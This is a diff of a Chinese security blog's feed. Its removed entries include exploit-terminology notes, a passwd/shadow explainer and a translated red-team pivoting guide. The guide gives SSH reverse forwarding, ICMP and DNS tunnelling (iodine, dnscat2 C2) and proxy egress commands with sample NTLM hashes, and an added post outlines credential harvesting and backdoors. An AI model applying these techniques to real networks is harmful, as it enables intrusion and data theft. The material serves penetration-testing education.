-<p>另外：<br>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p>
-<p>尾巴：<br>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个Exp，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧！</p>
-]]></content>
+    <content type="html"><![CDATA[<p>浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门<br>我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="登录密码"><a href="#登录密码" class="headerlink" title="登录密码"></a>登录密码</h3><p>Windows的登录密码保存在<code>%windir%\System32\config\SAM</code>中，</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。&lt;br&gt;Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。&lt;br&gt;Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。&lt;br&gt;Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。&lt;/p&gt;
-&lt;p&gt;几点注意：&lt;br&gt;PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。&lt;br&gt;Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。&lt;br&gt;Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。&lt;br&gt;Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。&lt;/p&gt;
+      &lt;p&gt;浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门&lt;br&gt;我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。&lt;/p&gt;
+&lt;h2 id=&quot;Windows&quot;&gt;&lt;a href=&quot;#Windows&quot;
     
     </summary>
     
@@ -308,410 +507,20 @@
   </entry>
   
   <entry>
-    <title>Linux中/etc/passwd与/etc/shadow的区别</title>
-    <link href="https://howiezhao.github.io/2018/04/29/passwd-and-shadow/"/>
-    <id>https://howiezhao.github.io/2018/04/29/passwd-and-shadow/</id>
-    <published>2018-04-29T07:32:14.000Z</published>
-    <updated>2018-04-29T08:29:31.463Z</updated>
-    
-    <content type="html"><![CDATA[<p>简单来说，<code>/etc/passwd</code>存储一般的用户信息，任何人都可以访问；<code>/etc/shadow</code>存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍：</p>
-<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p>早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了<code>/etc/shadow</code>文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。<br><code>/etc/passwd</code>的文件格式为：<strong>用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell</strong>，如果密码被存储在了<code>/etc/shadow</code>文件中，则此文件中密码项为x，常见形式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div></pre></td></tr></table></figure></p>
-<h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p><code>/etc/shadow</code>的文件格式为：<strong>用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段</strong>，如果密码项为 ! 或 * ，则代表此账号不能用于登录，密码项中更为详细的格式为：<strong>\$加密方法ID\$Salt\$加密值</strong>，常见形式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root:<span class="variable">$6</span><span class="variable">$Fsf6Q6SH</span><span class="variable">$MlagWih0lcGFxtAo7</span>/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::</div></pre></td></tr></table></figure></p>
-]]></content>
+    <title>针对哈希算法的攻击</title>
+    <link href="https://howiezhao.github.io/2018/05/09/hash-attack/"/>
+    <id>https://howiezhao.github.io/2018/05/09/hash-attack/</id>
+    <published>2018-05-09T05:27:54.000Z</published>
+    <updated>2018-05-09T05:29:02.911Z</updated>
     
     <summary type="html">
-    
-      &lt;p&gt;简单来说，&lt;code&gt;/etc/passwd&lt;/code&gt;存储一般的用户信息，任何人都可以访问；&lt;code&gt;/etc/shadow&lt;/code&gt;存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍：&lt;/p&gt;
-&lt;h2 id=&quot;etc-passwd&quot;&gt;&lt;a href
     
     </summary>
     
       <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
     
     
-      <category term="渗透" scheme="https://howiezhao.github.io/tags/%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kali Rolling 2017中无法登录BeEF的解决方案</title>
-    <link href="https://howiezhao.github.io/2018/02/08/kali-beef-bug/"/>
-    <id>https://howiezhao.github.io/2018/02/08/kali-beef-bug/</id>
-    <published>2018-02-08T11:18:51.000Z</published>
-    <updated>2018-02-08T11:41:07.846Z</updated>
-    
-    <content type="html"><![CDATA[<p>在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：<br>将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">minified = Uglifier.compile(evaluated)</div></pre></td></tr></table></figure></p>
-<p>改为<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">minified = evaluated</div></pre></td></tr></table></figure></p>
-<p>保存并重启BeEF即可。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：&lt;br&gt;将/usr/share/beef-xss/extensions/admin_ui
-    
-    </summary>
-    
-      <category term="Bug" scheme="https://howiezhao.github.io/categories/Bug/"/>
-    
-    
-      <category term="Kali" scheme="https://howiezhao.github.io/tags/Kali/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Udacity CS373:无人驾驶汽车编程学习笔记一</title>
-    <link href="https://howiezhao.github.io/2017/12/14/cs373-1/"/>
-    <id>https://howiezhao.github.io/2017/12/14/cs373-1/</id>
-    <published>2017-12-13T16:04:03.000Z</published>
-    <updated>2018-03-21T15:05:49.257Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="一：定位"><a href="#一：定位" class="headerlink" title="一：定位"></a>一：定位</h2><p>蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。<br>基于一维的蒙特卡罗定位程序如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">p = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">world = [<span class="string">'green'</span>, <span class="string">'red'</span>, <span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'green'</span>]</div><div class="line">measurements = [<span class="string">'red'</span>, <span class="string">'green'</span>]</div><div class="line">motions = [<span class="number">1</span>, <span class="number">1</span>]</div><div class="line">pHit = <span class="number">0.6</span></div><div class="line">pMiss = <span class="number">0.2</span></div><div class="line">pExact = <span class="number">0.8</span></div><div class="line">pOvershoot = <span class="number">0.1</span></div><div class="line">pUndershoot = <span class="number">0.1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sense</span><span class="params">(p, Z)</span>:</span></div><div class="line">    q = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</div><div class="line">        hit = (Z == world[i])</div><div class="line">        q.append(p[i] * (hit * pHit + (<span class="number">1</span>-hit) * pMiss))</div><div class="line">    s = sum(q)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (len(p)):</div><div class="line">        q[i] = q[i]/s</div><div class="line">    <span class="keyword">return</span> q</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(p, U)</span>:</span></div><div class="line">    q= []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</div><div class="line">        s = pExact * p[(i-U) % len(p)]</div><div class="line">        s = s + pOvershoot * p[(i-U<span class="number">-1</span>) % len(p)]</div><div class="line">        s = s + pUndershoot * p[(i-U+<span class="number">1</span>) % len(p)]</div><div class="line">        q.append(s)</div><div class="line">    <span class="keyword">return</span> q</div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(len(measurements)):</div><div class="line">    p = sense(p, measurements[k])</div><div class="line">    p = move(p, motions[k])</div><div class="line">    <span class="keyword">print</span> p</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;一：定位&quot;&gt;&lt;a href=&quot;#一：定位&quot; class=&quot;headerlink&quot; title=&quot;一：定位&quot;&gt;&lt;/a&gt;一：定位&lt;/h2&gt;&lt;p&gt;蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定
-    
-    </summary>
-    
-      <category term="Notes" scheme="https://howiezhao.github.io/categories/Notes/"/>
-    
-    
-      <category term="CS373" scheme="https://howiezhao.github.io/tags/CS373/"/>
-    
-      <category term="无人驾驶" scheme="https://howiezhao.github.io/tags/%E6%97%A0%E4%BA%BA%E9%A9%BE%E9%A9%B6/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一个Red Team成员的跳板(pivoting)指南</title>
-    <link href="https://howiezhao.github.io/2017/12/10/pivoting-guide/"/>
-    <id>https://howiezhao.github.io/2017/12/10/pivoting-guide/</id>
-    <published>2017-12-10T14:51:35.000Z</published>
-    <updated>2018-02-09T05:53:37.804Z</updated>
-    
-    <content type="html"><![CDATA[<p>本文翻译自<a href="https://artkond.com/2017/03/23/pivoting-guide/" target="_blank" rel="external">https://artkond.com/2017/03/23/pivoting-guide/</a> ，正文如下：</p>
-<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。<br><a id="more"></a></p>
-<h1 id="以公有IP为目标"><a href="#以公有IP为目标" class="headerlink" title="以公有IP为目标"></a>以公有IP为目标</h1><p>一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。</p>
-<h2 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a>SSH端口转发</h2><p>设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@host -D 1080</div></pre></td></tr></table></figure></p>
-<p>这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@host -L 445:192.168.1.1:445</div></pre></td></tr></table></figure></p>
-<p>这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。</p>
-<h3 id="通过SSH的VPN"><a href="#通过SSH的VPN" class="headerlink" title="通过SSH的VPN"></a>通过SSH的VPN</h3><p>由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用<code>proxychains</code>或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在<code>/etc/ssh/sshd_config</code>文件（服务器端）中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin yes</div><div class="line">PermitTunnel yes</div></pre></td></tr></table></figure></p>
-<p>客户端上的以下命令将在客户端和服务器上创建一对tun设备：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh username@server -w any:any</div></pre></td></tr></table></figure></p>
-<p>标志<code>-w</code>接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— <code>-w 0:0</code>，也可以使用<code>-w any:any</code>语法来获取下一个可用的tun设备。<br>tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0</div></pre></td></tr></table></figure></p>
-<p>服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0</div></pre></td></tr></table></figure></p>
-<p>在服务器上启用IP转发和NAT：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure></p>
-<p>现在，你可以将对等主机<code>1.1.1.1</code>设置为你的默认网关，或通过它路由到特定的主机/网络：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route add -net 10.0.0.0/16 gw 1.1.1.1</div></pre></td></tr></table></figure></p>
-<p>在这个例子中，服务器的外部网络接口是<code>eth0</code>，两端新创建的tun设备是<code>tun0</code>。</p>
-<h2 id="3proxy"><a href="#3proxy" class="headerlink" title="3proxy"></a>3proxy</h2><p>在这里获取 - <a href="https://github.com/z3APA3A/3proxy/releases" target="_blank" rel="external">https://github.com/z3APA3A/3proxy/releases</a> 。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是<code>./configure &amp;&amp; make</code> :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。<br>这个工具从配置文件中获得所有选项。运行它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">3proxy.exe config_file</div></pre></td></tr></table></figure></p>
-<p>或者如果你在Linux系统上：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./3proxy config_file</div></pre></td></tr></table></figure></p>
-<p>要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socks -p1080</div></pre></td></tr></table></figure></p>
-<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp" target="_blank" rel="external">https://3proxy.ru/howtoe.asp</a> 。要对特定端口进行隧道使用，请用以下语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</div></pre></td></tr></table></figure></p>
-<h1 id="NAT场景"><a href="#NAT场景" class="headerlink" title="NAT场景"></a>NAT场景</h1><p>这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。</p>
-<h2 id="SSH反向端口转发-w-3proxy"><a href="#SSH反向端口转发-w-3proxy" class="headerlink" title="SSH反向端口转发/w 3proxy"></a>SSH反向端口转发/w 3proxy</h2><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行3proxy服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socks -p31337</div></pre></td></tr></table></figure></p>
-<p>在接收方（攻击者的机器）上创建一个单独的用户。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adduser sshproxy</div></pre></td></tr></table></figure></p>
-<p>这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">...</div><div class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/<span class="literal">false</span></div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>现在使用<code>-R</code>标志连接到新创建的用户的服务器。Linux系统：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh sshproxy@your_server -R 31337:127.0.0.1:31337</div></pre></td></tr></table></figure></p>
-<p>对于Windows，你将需要首先上传<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="external">plink.exe</a>。这是一个putty的控制台版本。运行它：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337</div></pre></td></tr></table></figure></p>
-<p><code>-R</code>标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh<code>-R</code>标志访问攻击者主机上的这个端口。</p>
-<h2 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h2><p>这是我最喜欢穿越NAT连接的方法。<a href="https://github.com/artkond/rpivot" target="_blank" rel="external">Rpivot</a>是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与<code>ssh -D</code>很像，但方向相反。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</div></pre></td></tr></table></figure></p>
-<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;ip&gt; --server-port 9999</div></pre></td></tr></table></figure></p>
-<p>结果，一个socks4代理服务将被绑定在服务器端的1080端口。</p>
-<h1 id="从内部网络泄漏"><a href="#从内部网络泄漏" class="headerlink" title="从内部网络泄漏"></a>从内部网络泄漏</h1><p>这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。</p>
-<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/" target="_blank" rel="external">http://code.gerade.org/hans/</a> 。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./hans -v -f -s 1.1.1.1 -p P@ssw0rd</div></pre></td></tr></table></figure></p>
-<p><code>-v</code>标志是详细的，<code>-f</code>标志在前台运行，<code>-s</code>标志的值是服务器在新创建的tun接口上的ip。<br>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v</div></pre></td></tr></table></figure></p>
-<p>连接成功后，客户端应该可以直接在1.1.1.100处看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ping 1.1.1.100</span></div><div class="line">PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.</div><div class="line">64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms</div></pre></td></tr></table></figure></p>
-<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。</p>
-<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup" target="_blank" rel="external">这个手册</a>可能会帮助你设置你的名称服务器。</p>
-<h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h3><p>如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试<a href="http://code.kryo.se/iodine/" target="_blank" rel="external">iodine</a>。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</div></pre></td></tr></table></figure></p>
-<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodine -f -P P@ssw0rd tunneldomain.com -r</div></pre></td></tr></table></figure></p>
-<p>连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</div></pre></td></tr></table></figure></p>
-<h3 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h3><p><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">Dnscat2</a>通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby ./dnscat2.rb tunneldomain.com</div></pre></td></tr></table></figure></p>
-<p>客户端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./dnscat2 tunneldomain.com</div></pre></td></tr></table></figure></p>
-<p>在收到服务器端的连接后，可以使用<code>windows</code>命令查看活动会话：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; windows</div><div class="line">0 :: main [active]</div><div class="line">  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]</div><div class="line">  1 :: <span class="built_in">command</span> session (debian)</div><div class="line">  2 :: sh (debian) [*]</div></pre></td></tr></table></figure></p>
-<p>要启动端口转发，请选择带有<code>session -i &lt;num&gt;</code>的命令会话：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; session -i 1</div><div class="line">New window created: 1</div><div class="line">New window created: 1</div><div class="line">history_size (session) =&gt; 1000</div><div class="line">This is a <span class="built_in">command</span> session!</div><div class="line"></div><div class="line">That means you can enter a dnscat2 <span class="built_in">command</span> such as</div><div class="line"><span class="string">'ping'</span>! For a full list of clients, try <span class="string">'help'</span>.</div><div class="line"></div><div class="line"><span class="built_in">command</span> session (debian) 1&gt;</div></pre></td></tr></table></figure></p>
-<p>使用<code>listen [lhost:]lport rhost:rport</code>命令转发一个端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">command</span> session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</div></pre></td></tr></table></figure></p>
-<p>这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。</p>
-<h2 id="公司的HTTP代理作为一种出路"><a href="#公司的HTTP代理作为一种出路" class="headerlink" title="公司的HTTP代理作为一种出路"></a>公司的HTTP代理作为一种出路</h2><p>HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;）</p>
-<h3 id="Rpivot-1"><a href="#Rpivot-1" class="headerlink" title="Rpivot"></a>Rpivot</h3><p>我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\</div><div class="line">--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</div><div class="line">--username Alice --password P@ssw0rd</div></pre></td></tr></table></figure></p>
-<p>或者如果你有LM:NT哈希而不是密码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python client.py --server-ip &lt;rpivot_server_ip&gt;\</div><div class="line">--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</div><div class="line">--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</div></pre></td></tr></table></figure></p>
